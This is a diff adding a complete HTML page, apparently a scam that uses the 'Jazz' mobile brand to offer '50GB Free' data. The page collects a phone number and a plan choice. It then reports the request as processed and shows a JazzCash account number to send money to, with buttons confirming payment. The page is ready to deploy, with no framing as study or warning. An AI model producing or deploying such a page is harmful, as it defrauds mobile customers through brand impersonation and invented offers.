@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Jazz 50GB Free</title>
+  <style>
+    :root{
+      --bg1:#0a1b39; --bg2:#061427; --card:#0d1323; --text:#eaf1ff;
+      --muted:#9fb0cc; --primary:#2f6bff; --primaryHover:#1c4ed8; --accent:#16a34a;
+      --ring:#3b82f6;
+    }
+    *{box-sizing:border-box;}
+    body{
+      margin:0; font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
+      color:var(--text);
+      background: radial-gradient(1200px 600px at 50% -100px, var(--bg1), var(--bg2));
+      min-height:100vh; display:grid; place-items:center; padding:24px;
+    }
+    .card{
+      width:100%; max-width:480px; background:var(--card);
+      border-radius:18px; padding:28px; box-shadow:0 10px 40px rgba(0,0,0,.35);
+      border:1px solid rgba(255,255,255,.06);
+    }
+    h1{margin:0 0 18px; font-size:28px; text-align:center;}
+    label{display:block; font-size:14px; color:var(--muted); margin-bottom:8px;}
+    input[type="tel"]{
+      width:100%; padding:14px 16px; border-radius:12px; border:1px solid rgba(255,255,255,.12);
+      background:#0b1020; color:var(--text); outline:none; font-size:16px;
+    }
+    input[type="tel"]:focus{border-color:var(--ring); box-shadow:0 0 0 4px rgba(59,130,246,.15);}
+    .plans{margin:18px 0 6px; display:grid; gap:10px;}
+    .plan{display:flex; align-items:center; gap:10px; padding:10px 12px; border-radius:12px; background:#0b1020;}
+    .actions{display:grid; gap:12px; margin-top:20px;}
+    button, .btn{
+      display:block; width:100%; text-align:center; padding:14px 16px; border-radius:12px;
+      font-weight:600; border:none; cursor:pointer; text-decoration:none;
+    }
+    .primary{background:var(--primary); color:white;}
+    .primary:hover{background:var(--primaryHover);}
+    .secondary{background:#475569; color:white;}
+    .secondary:hover{background:#334155;}
+    .note{margin-top:10px; font-size:12px; color:var(--muted); text-align:center;}
+    .error{color:#ff8b8b; font-size:13px; margin-top:8px; display:none;}
+    .ok{color:#86efac; font-size:14px; margin-top:12px; display:none; white-space:pre-line;}
+    .extra-buttons{display:none; margin-top:15px; gap:10px;}
+  </style>
+</head>
+<body>
+  <main class="card">
+    <h1>Jazz 50GB Free</h1>
+
+    <form id="subForm">
+      <label for="msisdn">Enter MSISDN (10–11 digits)</label>
+      <input id="msisdn" name="msisdn" type="tel" inputmode="numeric" autocomplete="tel"
+             placeholder="03XXXXXXXXX" minlength="10" maxlength="11"
+             pattern="\\d{10,11}" required>
+
+      <div class="plans" role="radiogroup" aria-label="Plan">
+        <div class="plan">
+          <input type="radio" id="daily"   name="plan" value="Daily">
+          <label for="daily" style="margin:0;color:#cdd7ef;">Daily</label>
+        </div>
+        <div class="plan">
+          <input type="radio" id="weekly"  name="plan" value="Weekly" checked>
+          <label for="weekly" style="margin:0;color:#cdd7ef;">Weekly</label>
+        </div>
+        <div class="plan">
+          <input type="radio" id="monthly" name="plan" value="Monthly">
+          <label for="monthly" style="margin:0;color:#cdd7ef;">Monthly</label>
+        </div>
+      </div>
+
+      <div id="msgError" class="error">Please enter a valid 10–11 digit number and select a plan.</div>
+      <div id="msgOk" class="ok"></div>
+
+      <div class="actions">
+        <button class="primary" type="submit">Activate</button>
+      </div>
+
+      <!-- Extra choice buttons -->
+      <div class="extra-buttons" id="extraBtns">
+        <button type="button" class="primary" id="alreadySent">I have already sent</button>
+        <button type="button" class="secondary" id="willSend">I will send later</button>
+      </div>
+
+      <p class="note">Offer available for Jazz customers only.</p>
+    </form>
+  </main>
+
+  <script>
+    const form = document.getElementById("subForm");
+    const err = document.getElementById("msgError");
+    const ok  = document.getElementById("msgOk");
+    const extraBtns = document.getElementById("extraBtns");
+
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      err.style.display="none"; ok.style.display="none"; extraBtns.style.display="none";
+
+      const msisdn = (document.getElementById("msisdn").value || "").trim();
+      const plan = (new FormData(form).get("plan") || "").trim();
+      const valid = /^\d{10,11}$/.test(msisdn) && plan;
+
+      if (!valid){ err.style.display="block"; return; }
+
+      // Show JazzCash account info
+      ok.textContent = 
+        "✅ Your request has been processed.\n\n" +
+        "Account Details:\n" +
+        "Bank: JazzCash\n" +
+        "Account Number: 03044527009";
+      ok.style.display="block";
+      extraBtns.style.display="grid";
+
+      // Save MSISDN for next page
+      localStorage.setItem("userNumber", msisdn);
+    });
+
+    // "I have already sent" → go to success page
+    document.getElementById("alreadySent").addEventListener("click", () => {
+      window.location.href = "success.html";
+    });
+
+    // "I will send later" → just hide nothing (stay here)
+    document.getElementById("willSend").addEventListener("click", () => {
+      alert("Okay! You can send later using the above account details.");
+    });
+  </script>
+</body>
+</html>
